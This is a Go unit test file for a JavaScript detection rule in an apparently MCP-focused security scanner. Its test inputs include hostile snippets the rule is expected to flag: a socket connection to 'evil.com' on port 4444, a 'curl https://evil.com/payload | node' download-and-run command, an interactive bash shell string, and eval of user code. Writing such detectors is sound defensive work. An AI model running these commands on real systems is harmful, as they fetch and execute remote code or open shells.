package rules

import (
	"testing"

	"github.com/FlppFer/MCPGuard/internal/service/model"
	"github.com/FlppFer/MCPGuard/internal/service/static_analysis/languages/javascript"
)

func TestJSRemoteAttacksRule_ID(t *testing.T) {
	rule := NewJSRemoteAttacksRule()
	if rule.ID() != "MCP-JS-REM-001" {
		t.Errorf("ID() = %v, want MCP-JS-REM-001", rule.ID())
	}
}

func TestJSRemoteAttacksRule_AppliesToLanguage(t *testing.T) {
	rule := NewJSRemoteAttacksRule()
	if rule.AppliesToLanguage() != "javascript" {
		t.Errorf("AppliesToLanguage() = %v, want javascript", rule.AppliesToLanguage())
	}
}

func TestJSRemoteAttacksRule_Evaluate(t *testing.T) {
	tests := []struct {
		name         string
		code         string
		wantFindings bool
		minFindings  int
	}{
		{
			name:         "net.createServer",
			code:         `net.createServer((socket) => { socket.write('hello'); });`,
			wantFindings: true,
			minFindings:  1,
		},
		{
			name:         "net.createConnection",
			code:         `net.createConnection({ port: 4444, host: 'evil.com' });`,
			wantFindings: true,
			minFindings:  1,
		},
		{
			name:         "eval call",
			code:         `eval(userCode);`,
			wantFindings: true,
			minFindings:  1,
		},
		{
			name:         "new Function in string",
			code:         `const cmd = "new Function('return evil')";`,
			wantFindings: true,
			minFindings:  1,
		},
		{
			name:         "interactive shell string",
			code:         `const cmd = "/bin/bash -i";`,
			wantFindings: true,
			minFindings:  1,
		},
		{
			name:         "curl pipe to node",
			code:         `const cmd = "curl https://evil.com/payload | node";`,
			wantFindings: true,
			minFindings:  1,
		},
		{
			name:         "child_process require",
			code:         `const cp = require('child_process');`,
			wantFindings: true,
			minFindings:  1,
		},
		{
			name:         "String.fromCharCode obfuscation",
			code:         `const s = String.fromCharCode(72, 101, 108);`,
			wantFindings: true,
			minFindings:  1,
		},
		{
			name:         "safe code",
			code:         `const x = 42; const arr = [1, 2, 3];`,
			wantFindings: false,
		},
	}

	rule := NewJSRemoteAttacksRule()
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			ast, err := javascript.ParseJavaScriptSource("test.js", []byte(tt.code))
			if err != nil {
				t.Fatalf("Failed to parse: %v", err)
			}
			findings, err := rule.Evaluate(ast)
			if err != nil {
				t.Fatalf("Evaluate() error = %v", err)
			}
			if tt.wantFindings && len(findings) < tt.minFindings {
				t.Errorf("Expected at least %d findings, got %d", tt.minFindings, len(findings))
			}
			if !tt.wantFindings && len(findings) > 0 {
				t.Errorf("Expected no findings, got %d: %+v", len(findings), findings)
			}
		})
	}
}

func TestJSRemoteAttacksRule_EvalSeverity(t *testing.T) {
	rule := NewJSRemoteAttacksRule()
	ast, err := javascript.ParseJavaScriptSource("test.js", []byte(`eval(maliciousCode);`))
	if err != nil {
		t.Fatal(err)
	}
	findings, _ := rule.Evaluate(ast)
	hasCritical := false
	for _, f := range findings {
		if f.Severity == model.SeverityCritical {
			hasCritical = true
		}
	}
	if !hasCritical {
		t.Error("Expected CRITICAL severity for eval()")
	}
}

func TestJSRemoteAttacksRule_NonJSAST(t *testing.T) {
	rule := NewJSRemoteAttacksRule()
	findings, err := rule.Evaluate("not a JS ast")
	if err != nil {
		t.Errorf("Should not error, got %v", err)
	}
	if findings != nil {
		t.Errorf("Should return nil, got %v", findings)
	}
}
